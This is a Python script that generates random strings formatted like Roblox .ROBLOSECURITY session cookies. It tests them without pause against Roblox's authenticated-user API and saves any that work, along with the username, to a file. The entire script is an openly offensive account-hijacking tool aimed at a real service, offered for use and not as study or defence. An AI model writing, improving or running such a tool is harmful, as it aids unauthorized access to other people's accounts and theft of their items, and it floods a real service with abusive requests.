import random
import os
import httpx

# Define gradient colors
green_shades = [
    "\033[92m",  # Light Green
    "\033[92m",  # Light Green
    "\033[32m",  # Medium Green
    "\033[32m",  # Medium Green
    "\033[0;32m"  # Dark Green
]

red_shades = [
    "\033[91m",  # Light Red
    "\033[91m",  # Light Red
    "\033[31m",  # Medium Red
    "\033[31m",  # Medium Red
    "\033[0;31m"  # Dark Red
]

def apply_gradient(text, shades):
    lines = text.splitlines()
    gradient_length = len(shades)
    gradient_text = ""
    for i, line in enumerate(lines):
        color_index = (i * gradient_length // len(lines)) % gradient_length
        gradient_text += shades[color_index] + line + "\033[0m\n"
    return gradient_text

def green_text(text):
    return f"\033[92m{text}\033[0m"

def red_text(text):
    return f"\033[91m{text}\033[0m"

def generate_cookie():
    # Generate a random length between 500 and 1100 for Roblox-like cookies
    length = random.randint(500, 1100)
    
    # Generate a random hexadecimal code with the selected length (using 0-9 and A-F)
    randomized_code = ''.join(random.choices('0123456789ABCDEF', k=length))
    
    # Construct the cookie with the randomized code
    warning_message = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    return warning_message + randomized_code

def get_username(cookie):
    user_info_url = 'https://users.roblox.com/v1/users/authenticated'
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    
    try:
        # Using httpx for faster requests
        with httpx.Client() as client:
            response = client.get(user_info_url, headers=headers)
        
        if response.status_code == 200:
            user_data = response.json()
            username = user_data.get('name', 'N/A')
            return username, True
        elif response.status_code == 400:  # This indicates an invalid or expired cookie
            return "Wrong cookie.", False
        else:
            return f"Failed with status code {response.status_code}", False
    except httpx.RequestError as e:
        return f"An error occurred: {e}", False

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    ascii_art = """
       ▄████▄   ▒█████   ▒█████   ██ ▄█▀ ██▓▓█████ 
      ▒██▀ ▀█  ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓██▒▓█   ▀ 
      ▒▓█    ▄ ▒██░  ██▒▒██░  ██▒▓███▄░ ▒██▒▒███   
      ▒▓▓▄ ▄██▒▒██   ██░▒██   ██░▓██ █▄ ░██░░▒▓█  ▄ 
      ▒ ▓███▀ ░░ ████▓▒░░ ████▓▒░▒██▒ █▄░██░░▒████▒
      ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░░ ▒░ ░
        ░  ▒     ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░ ░ ░  ░
      ░        ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ▒ ░   ░   
      ░ ░          ░ ░      ░ ░  ░  ░    ░     ░  ░
      ░                                            
    """
    print(apply_gradient(ascii_art, green_shades))
    
    while True:
        cookie = generate_cookie()  # Generate a new cookie each time
        username, valid = get_username(cookie)
        
        if valid:
            print(apply_gradient(f"Successful: {cookie} {username}", green_shades))
            with open('cookies.txt', 'a') as f:
                f.write(f"{cookie} {username}\n")
        else:
            print(apply_gradient(f"Wrong cookie: {cookie}", red_shades))

        # Here, we do NOT add any sleep delay. The next cookie is generated as soon as the current request finishes.

if __name__ == "__main__":
    main()
